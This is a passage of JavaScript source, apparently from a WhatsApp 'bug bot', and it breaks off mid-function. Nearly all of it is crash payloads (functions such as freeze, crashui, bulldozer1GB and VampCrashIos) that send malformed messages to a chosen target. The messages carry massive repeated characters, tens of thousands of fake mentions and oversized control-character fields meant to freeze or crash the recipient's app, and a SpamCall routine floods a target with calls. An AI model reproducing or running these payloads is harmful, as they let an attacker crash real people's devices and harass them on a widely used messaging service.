  const msg = generateWAMessageFromContent(target, generateMessage, {});

  await Prime.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await Prime.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "𝐁𝐞𝐭𝐚 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 - 𝟗𝟕𝟒𝟏" },
            content: undefined,
          },
        ],
      }
    );
  }
}
async function Nullvisible(target) {
            await Prime.relayMessage(target, {
            viewOnceMessage: {
            message: {
            interactiveResponseMessage: {
            body: {
            text: "visiblemoment",
            format: "DEFAULT"
                    },
            nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0003".repeat(1000000),
            version: 3
            }
            }
            }
            }
            }, { participant: { jid: target}});
    
    
}
async function InvisHard(target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "INVISHARDER",
                    footerText: "InvisibleHard༑",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "🇷🇺" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await Prime.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await Prime.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "InvisHarder" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
async function protocolbug7(target, mention) {
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, messageContent, { userJid: target });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await Prime.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await Prime.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}

async function bulldozer1GB(target) {
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = "image/webp"; // ✅ fixed

  if (11 > 9) {
    parse = parse ? false : true;
  }

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type, // ✅ fixed
          directPath:
            "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1000 * 40 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});
  await Prime.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
//////2
async function xPro(target, mention) {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        audioMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
          mimetype: "audio/mpeg",
          fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145, 0, 70, 137, 73, 190, 145, 0,
            44, 165, 102, 153, 233, 111, 114, 69, 10, 55, 61, 186, 131, 245,
            153, 93, 211,
          ]),
          fileLength: 432722,
          seconds: 20,
          ptt: false,
          mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254, 75, 254, 190, 229, 25, 16, 78, 48, 98,
            117, 42, 71, 65, 199, 10, 164, 16, 57, 189, 229, 54, 93, 69, 6, 212,
            145,
          ]),
          fileEncSha256: Buffer.from([
            29, 27, 247, 158, 114, 50, 140, 73, 40, 108, 77, 206, 2, 12, 84,
            131, 54, 42, 63, 11, 46, 208, 136, 131, 224, 87, 18, 220, 254, 211,
            83, 153,
          ]),
          directPath:
            "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
          mediaKeyTimestamp: 1746275400,
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});

  await Prime.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await Prime.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "AETERNYX - INVISIBLE" },
            content: undefined,
          },
        ],
      }
    );
  }
}
///////3
async function freeze(target, mention) {
  // Default true biar otomatis nyala
  const delaymention = Array.from({ length: 300000 }, (_, r) => ({
    title: "᭡꧈".repeat(99555),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "Aeternyx Here,Jan Panik Bug Doang Ini",
          listType: 2,
          buttonText: null,
          sections: delaymention,
          singleSelectReply: { selectedRowId: "🔴" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "333333333333@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "Woi anjeng",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };

  const msg = generateWAMessageFromContent(target, MSG, {});

  await Prime.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  // **Cek apakah mention true sebelum menjalankan relayMessage**
  if (mention) {
    await Prime.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "𝐀𝐞𝐭𝐞𝐫𝐧𝐲𝐱 𝐌𝐞𝐧𝐭𝐢𝐨𝐧" },
            content: undefined,
          },
        ],
      }
    );
  }
}
async function freezechat(target, mention) {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "Panik ya njing",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath:
            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});

  await Prime.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await Prime.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "𝐀𝐞𝐭𝐞𝐫𝐧𝐲𝐱 𝐌𝐞𝐧𝐭𝐢𝐨𝐧 - 𝟗𝟕𝟒𝟏" },
            content: undefined,
          },
        ],
      }
    );
  }
}
async function natifui(target) {
Prime.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(20000) + "@1".repeat(20000),
    contextInfo: {
      stanzaId: target,
      participant: "5521992999999@s.whatsapp.net", 
      quotedMessage: {
        conversation: "༑𝐀𝐞𝐭𝐞𝐫𝐧𝐲𝐱͢⟡𝐕𝐨𝐱⃟💥" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(20000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}
///// INI UI JUGA
async function crashui(target) {
    await Prime.relayMessage(target, {
        viewOnceMessage: {
            message: {
                buttonsMessage: {
                    text: "🎭",
                    contentText: "༑𝐀𝐞𝐭𝐞𝐫𝐧𝐲𝐱͢⟡𝐕𝐨𝐱⃟💥" + "@1".repeat(60000),
                    footerText: "#-༑𝐀𝐞𝐭𝐞𝐫𝐧𝐲𝐱͢⟡𝐕𝐨𝐱⃟💥",
                    buttons: [{
                        buttonId: ".a",
                        buttonText: {
                            displayText: "༑𝐀𝐞𝐭𝐞𝐫𝐧𝐲𝐱͢⟡𝐕𝐨𝐱⃟💥"
                        },
                        type: 1
                    }],
                    headerType: 1
                }
            }
        }
    }, {
        participant: {
            jid: target
        }
    });
}

async function CrL(target, Ptcp = true) {
  const crashText = "@1".repeat(30000);
  
  let message = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "༑𝐀𝐞𝐭𝐞𝐫𝐧𝐲𝐱͢⟡𝐕𝐨𝐱⃟💥",
              hasMediaAttachment: true,
            },
            body: {
              text: "༑𝐀𝐞𝐭𝐞𝐫𝐧𝐲𝐱͢⟡𝐕𝐨𝐱⃟💥" + crashText,
            },
            nativeFlowMessage: {
              messageParamsJson: "@1".repeat(60000),
            }
          }
        }
      }
    }),
    {
      userJid: target,
      quoted: null
    }
  );

  await Prime.relayMessage(
    target,
    message.message,
    Ptcp ? { participant: { jid: target } } : {}
  );
  ///  Yang baca edeot
}
 const VampUiCrash = JSON.stringify({
  status: true,
  criador: "VampAttack",
  resultado: {
    type: "md",
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"],
      },
      _eventsCount: 800000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 20000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 60000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true,
      },
    },
  },
});
async function xatanewfunction(target) {
  Prime.relayMessage(
    target,
    {
      interactiveMessage: {
        header: {
          title:
            "Assalamualaikum\n\n" +
            "Kak\n" +
            "ꦽ".repeat(50000) +
            "@1".repeat(50000),
          hasMediaAttachment: false,
        },
        body: {
          text:
            "༑𝐀𝐞𝐭𝐞𝐫𝐧𝐲𝐱͢⟡𝐕𝐨𝐱⃟💥" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
        },
        nativeFlowMessage: {
          messageParamsJson: "",
          buttons: [
            { name: "single_select", buttonParamsJson: VampUiCrash + "\u0003" },
            {
              name: "payment_method",
              buttonParamsJson: VampUiCrash + "\u0003",
            },
            {
              name: "call_permission_request",
              buttonParamsJson: VampUiCrash + "\u0003",
              voice_call: "call_galaxy",
            },
            { name: "form_message", buttonParamsJson: VampUiCrash + "\u0003" },
            {
              name: "catalog_message",
              buttonParamsJson: VampUiCrash + "\u0003",
            },
            { name: "send_location", buttonParamsJson: VampUiCrash + "\u0003" },
            { name: "view_product", buttonParamsJson: VampUiCrash + "\u0003" },
            {
              name: "payment_status",
              buttonParamsJson: VampUiCrash + "\u0003",
            },
            { name: "cta_call", buttonParamsJson: VampUiCrash + "\u0003" },
            { name: "cta_url", buttonParamsJson: VampUiCrash + "\u0003" },
            {
              name: "review_and_pay",
              buttonParamsJson: VampUiCrash + "\u0003",
            },
          ],
        },
      },
    },
    { participant: { jid: target } }
  );
}
const VampUiApi = JSON.stringify({
  status: true,
  criador: "VampireAttack",
  resultado: {
    type: "md",
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"]
      },
      _eventsCount: 800000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 20000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 60000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true
      }
    }
  }
});
async function VampSpamUi(target) {
  Prime.relayMessage(
    target,
    {
      interactiveMessage: {
        header: {
          title: "Aeternyx Here Bro!!!\n\n" + "Mampus\n" + "ꦽ".repeat(50000) + "@5".repeat(50000),
          hasMediaAttachment: false
        },
        body: {
          text: "༑𝐀𝐞𝐭𝐞𝐫𝐧𝐲𝐱͢⟡𝐕𝐨𝐱⃟💥",
        },
        nativeFlowMessage: {
          messageParamsJson: "",
          buttons: [
            { name: "single_select", buttonParamsJson: VampUiApi + "\u0003" },
            { name: "payment_method", buttonParamsJson: VampUiApi + "\u0003" },
            { name: "call_permission_request", buttonParamsJson: VampUiApi + "\u0003", voice_call: "call_galaxy" },
            { name: "form_message", buttonParamsJson: VampUiApi + "\u0003" },
            { name: "catalog_message", buttonParamsJson: VampUiApi + "\u0003" },
            { name: "send_location", buttonParamsJson: VampUiApi + "\u0003" },
            { name: "view_product", buttonParamsJson: VampUiApi + "\u0003" },
            { name: "payment_status", buttonParamsJson: VampUiApi + "\u0003" },
            { name: "cta_call", buttonParamsJson: VampUiApi + "\u0003" },
            { name: "cta_url", buttonParamsJson: VampUiApi + "\u0003" },
            { name: "review_and_pay", buttonParamsJson: VampUiApi + "\u0003" }
          ]
        }
      }
    },
    { participant: { jid: target } }
  );
}
async function VampPrivateBlank(target) {
  const Vampire = `_*~@2~*_\n`.repeat(10500);
  const Private = 'ꦽ'.repeat(5000);

  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "Pembasmi Kontol",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: '༑𝐀𝐞𝐭𝐞𝐫𝐧𝐲𝐱͢⟡𝐕𝐨𝐱⃟💥' + Vampire + Private,
          },
          footer: {
            text: '',
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "bokep.com",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await Prime.relayMessage(target, message, { participant: { jid: target } });
}     

async function SpamCall(Prime, jid, jumlah = 50) {
  console.log(chalk.redBright(`📞 Memulai spam call ke ${jid} sebanyak ${jumlah}x`));

  for (let i = 0; i < jumlah; i++) {
    try {
      const callId = `${Date.now()}-${Math.floor(Math.random() * 99999999)}`;

      const callMsg = {
        tag: 'call',
        attrs: {
          from: Prime.user.id,
          to: jid,
          id: callId
        },
        content: [
          {
            tag: 'offer',
            attrs: {
              'call-id': callId,
              'call-creator': Prime.user.id,
              'count': '0',
              'timestamp': `${Date.now()}`,
              'type': 'video' // Gunakan 'audio' jika ingin lebih ringan
            },
            content: []
          }
        ]
      };

      await Prime.query(callMsg);
      console.log(chalk.yellow(`[${i + 1}/${jumlah}] Call terkirim ke ${jid}`));

      await sleep(delay);

    } catch (err) {
      console.error(chalk.red(`❌ Gagal mengirim call ke ${jid}: ${err.message}`));
    }
  }

  console.log(chalk.green(`✅ Spam call ke ${jid} selesai.`));
}

// fangsien ipon
async function selios(target) {
    Prime.relayMessage(
        target,
        {
            extendedTextMessage: {
                text: "𓆩".repeat(20000) + "@1".repeat(20000),
                contextInfo: {
                    stanzaId: target,
                    participant: "5521992999999@s.whatsapp.net",
                    quotedMessage: {
                        conversation:
                        "༑𝐀𝐞𝐭𝐞𝐫𝐧𝐲𝐱͢⟡𝐕𝐨𝐱⃟💥" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(20000),
                    },
                    disappearingMode: {
                        initiator: "CHANGED_IN_CHAT",
                        trigger: "CHAT_SETTING",
                    },
                },
                inviteLinkGroupTypeV2: "DEFAULT",
            },
        },
        {
            paymentInviteMessage: {
                serviceType: "UPI",
                expiryTimestamp: Date.now() + 5184000000,
            },
        },
        {
            participant: {
                jid: target,
            },
        },
        {
            messageId: null,
        }
    );
}
async function VampiPhone(target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: '33333333333333333@newsletter',
                        newsletterName: "Hi Iphone, Im Aeternyx Is Beginner" + "ꦾ".repeat(120000),
                        jpegThumbnail: renlol,
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        await Prime.relayMessage(target, messsage, {
            userJid: target,
        });
    } catch (err) {
        console.log(err);
    }
}
async function VampCrashIos(target) {
    try {
        const IphoneCrash = "𑇂𑆵𑆴𑆿".repeat(60000);
        await Prime.relayMessage(
            target,
            {
                locationMessage: {
                    degreesLatitude: 11.11,
                    degreesLongitude: -11.11,
                    name: "iOS Crash          " + IphoneCrash,
                    url: "https://t.me/biyalue2",
                },
            },
            {
                participant: {
                    jid: target,
                },
            }
        );
        console.log("Aeternyx Sended Virus iOS");
    } catch (error) {
        console.error("Error Sending Bug:", error);
    }
}
async function xatafloods(Prime, target) {
  const header = {
    locationMessage: {
      degreesLatitude: 0,
      degreesLongitude: 0,
    },
    hasMediaAttachment: true,
  };
  const body = {
    text: "𝙸 𝙻𝙾𝚅𝙴 𝚈𝙾𝚄𝚄" + "᭯".repeat(90000),
  };
  const carouselMessage = {
    sections: [
      {
        title: "\u200C".repeat(90000),
        rows: [
          {
            title: "\u200D".repeat(90000),
            description: "\u200D".repeat(90000),
            rowId: "\u200D".repeat(90000),
          },
          {
            title: "\u200D".repeat(90000),
            description: "\u200D".repeat(90000),
            rowId: "\u200D".repeat(90000),
          },
        ],
      },
      {
        title: "\u200c".repeat(90000),
        rows: [
          {
            title: "\u200D".repeat(90000),
            description: "\u200D".repeat(90000),
            rowId: "\u200D".repeat(90000),
          },
          {
            title: "\u200D".repeat(90000),
            description: "\u200D".repeat(90000),
            rowId: "\u200D".repeat(90000),
          },
        ],
      },
      {
        title: "\u200c".repeat(90000),
        rows: [
          {
            title: "\u200D".repeat(90000),
            description: "\u200D".repeat(90000),
            rowId: "\u200D".repeat(90000),
          },
          {
            title: "\u200D".repeat(90000),
            description: "\u200D".repeat(90000),
            rowId: "\u200D".repeat(90000),
          },
        ],
      },
      {
        title: "\u200c".repeat(90000),
        rows: [
          {
            title: "\u200D".repeat(90000),
            description: "\u200D".repeat(90000),
            rowId: "\u200D".repeat(90000),
          },
          {
            title: "\u200D".repeat(90000),
            description: "\u200D".repeat(90000),
            rowId: "\u200D".repeat(90000),
          },
        ],
      },
    ],
  };
  await Prime.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: header,
            body: body,
            carouselMessage: carouselMessage,
          },
        },
      },
    },
    Ptcp ? { participant: { jid: target } } : { quoted: null }
  );
}

// hadiah by ryzen to yukina 🥸

async function robustfreeze(target, Ptcp = true) {
  try {
    await Prime.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "AETERNYX HERE ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝‌\n" +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
